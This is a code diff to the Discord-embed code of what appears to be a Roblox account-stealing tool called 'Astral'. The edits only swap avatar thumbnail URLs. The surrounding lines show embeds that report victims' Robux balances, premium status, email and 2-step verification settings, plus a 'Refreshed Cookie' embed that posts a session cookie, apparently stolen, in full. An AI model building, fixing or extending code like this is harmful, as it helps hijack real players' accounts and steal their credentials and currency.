@@ -332,9 +332,9 @@ export default {
         const moneyEmoji = '<:money:1334576383862771793>';
 
         const profileLink = `https://www.roblox.com/users/${d.userId}/profile`;
-        // FIXED: Proper avatar URL with 256x256 size
-        const avatarUrl = `https://thumbnails.roblox.com/v1/users/avatar?userIds=${d.userId}&size=256x256&format=Png&isCircular=false`;
-        const headshotUrl = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.userId}&size=256x256&format=Png&isCircular=false`;
+        // FIXED: Working Roblox avatar URL for Discord embeds
+        const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${d.userId}&width=256&height=256&format=png`;
+        const avatarFallback = `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${d.userId}&size=256x256&format=Png&isCircular=false`;
 
         let accountAge = 'Unknown';
         if (d.created) {
@@ -361,7 +361,7 @@ export default {
             title: `\`Astral Beams\` ${fire}`,
             color: 0xffffff,
             fields: fields,
-            thumbnail: { url: headshotUrl },
+            thumbnail: { url: avatarUrl },
             image: { url: avatarUrl },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
@@ -402,7 +402,7 @@ export default {
               { name: 'Groups', value: `Balance: ${d.groupBalance || 0}\nPending: ${d.groupPending || 0}\nOwned: ${d.groupOwned || 0}`, inline: false },
               { name: 'Settings', value: `Premium: ${d.premium ? `${yes} (${d.premiumRobux || 0} ${robuxEmoji})` : `${no} (0 ${robuxEmoji})`}\nMail: ${d.mailVerified ? `${yes} (Verified)` : `${no} (Unverified)`}\n2SV: ${d.twoStep ? `${yes} (Enabled)` : `${no} (Disabled)`}`, inline: false }
             ],
-            thumbnail: { url: headshotUrl },
+            thumbnail: { url: avatarUrl },
             image: { url: avatarUrl },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
@@ -422,7 +422,7 @@ export default {
             title: 'Refreshed Cookie',
             color: 0xffffff,
             description: '```' + cookieToSend + '```',
-            thumbnail: { url: headshotUrl || 'https://i.ibb.co/v6SjQn5D/astrallogo.webp' },
+            thumbnail: { url: avatarUrl || 'https://i.ibb.co/v6SjQn5D/astrallogo.webp' },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
